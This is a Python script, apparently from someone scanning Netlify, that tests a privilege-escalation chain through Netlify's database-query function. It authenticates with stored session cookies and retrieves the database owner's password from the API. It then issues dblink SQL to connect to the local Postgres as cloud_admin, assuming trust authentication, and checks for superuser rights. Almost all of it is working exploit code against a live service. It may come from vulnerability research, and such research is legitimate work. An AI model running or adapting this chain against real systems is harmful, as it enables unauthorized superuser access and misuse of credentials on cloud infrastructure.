# -*- coding: utf-8 -*-
"""Netlify database-query 提权链验证:dblink -> localhost postgres 库 -> cloud_admin(hba trust 假设)
单条 SQL 完成连接+查询;对照 netlifydb_owner 真密码连 postgres 库
"""
import http.client, ssl, gzip, brotli, json, sys, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET, AUTH_HEADER

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()


def fn_req(body, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw


def api_get(path):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=30)
    conn.request('GET', path, headers={'Authorization': AUTH_HEADER, 'Accept': 'application/json'})
    r = conn.getresponse()
    raw = r.read()
    conn.close()
    return r.status, raw


def run(tag, sql, cut=1000):
    try:
        s, raw = fn_req({'siteId': SITE_ID, 'action': 'query', 'sql': sql})
        body = raw.decode('utf-8', 'ignore').replace('\n', ' ')
        print('%-30s [%d] %s' % (tag, s, body[:cut]))
    except Exception as e:
        print('%-30s ERR %s' % (tag, str(e)[:100]))


# 取 owner 真密码(本地解析,不外显)
s, raw = api_get('/api/v1/sites/%s/database' % SITE_ID)
d = json.loads(raw.decode('utf-8', 'replace'))
cs = d.get('connection_strings', {}).get('netlifydb_owner', '')
m = re.search(r'postgresql://netlifydb_owner:([^@]+)@', cs)
OWNER_PW = m.group(1) if m else ''
HOST = re.search(r'@([^/]+)/', cs).group(1) if cs else 'localhost'
print('owner pw len:', len(OWNER_PW), '| host:', HOST)

# X1: 提权假设 - localhost cloud_admin 无密码信任(hba trust)
run('X1_dblink_cloud_admin', "select * from dblink('hostaddr=127.0.0.1 port=5432 dbname=postgres user=cloud_admin password=x connect_timeout=5', 'select current_user, (select rolsuper from pg_roles where rolname = current_user)') as t(u text, s boolean)")
# X2: 对照 - owner 真密码连 postgres 库(证明 localhost 可达 + postgres 库可连)
if OWNER_PW:
    run('X2_dblink_owner_pgdb', "select * from dblink('hostaddr=127.0.0.1 port=5432 dbname=postgres user=netlifydb_owner password=%s connect_timeout=5', 'select current_user, (select rolsuper from pg_roles where rolname = current_user)') as t(u text, s boolean)" % OWNER_PW)
# X3: 对照 - owner 真密码经公网 proxy 连 postgres 库(dblink 出网基线)
if OWNER_PW and HOST:
    run('X3_dblink_owner_remote', "select * from dblink('hostaddr=%s port=5432 dbname=postgres user=netlifydb_owner password=%s sslmode=require connect_timeout=8', 'select current_user') as t(u text)" % (HOST, OWNER_PW))
